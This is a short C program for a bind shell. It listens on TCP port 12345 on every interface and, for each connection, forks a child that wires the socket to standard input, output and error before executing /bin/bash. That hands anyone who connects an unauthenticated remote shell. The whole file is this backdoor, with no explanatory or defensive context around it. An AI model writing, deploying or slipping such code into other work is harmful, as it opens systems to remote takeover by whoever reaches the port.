#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h> //dup2
#include <stdint.h> 

void server_loop(uint16_t serv_sock){

	struct sockaddr_in	cliaddr = {0};
    uint32_t cli_sock = 0;
    socklen_t addrlen = sizeof(cliaddr);
    int ret = 0;

    while(1){
    
    	cli_sock = accept(serv_sock, (struct sockaddr*)(&cliaddr), &addrlen);

    	/*
    	 * fork, duplicate socket to child process, close server socket
    	 * in child dup 0-2 to client socket
    	 */

    	ret = fork();
    	if(ret == 0){
    		//Child
    		close(serv_sock);
    		dup2(cli_sock, 0);
    		dup2(cli_sock, 1);
    		dup2(cli_sock, 2);

    		execve("/bin/bash", NULL, NULL);
    		return;
    	}
    	else if(ret > 0){
    		// Parent SUCCESS
    		printf("[+] Shell connect! PID %d\n", ret);
    	}
    	else {
    		printf("[-] Shell Failure!\n");	
    	}
    	// Parent no longer needs this socket
    	close(cli_sock);
	}
}

int main(){

	uint16_t sock;
	struct sockaddr_in server;

	if((sock = socket(AF_INET, SOCK_STREAM, 0)) == 0){
		printf("socket error\n");
		return -1;
	}

	memset(&server, 0, sizeof(server));

	server.sin_family = AF_INET;
	server.sin_addr.s_addr = INADDR_ANY;
	server.sin_port = htons(12345);


	//setsockopt
	setsockopt(sock, SOL_SOCKET, SO_REUSEADDR|SO_REUSEPORT, &(int){1}, sizeof(uint32_t));
	
	//bind
	bind(sock, (struct sockaddr*)&server, sizeof(struct sockaddr_in));
	
	//listen
	listen(sock, 5);

	server_loop(sock);

	return 0;
}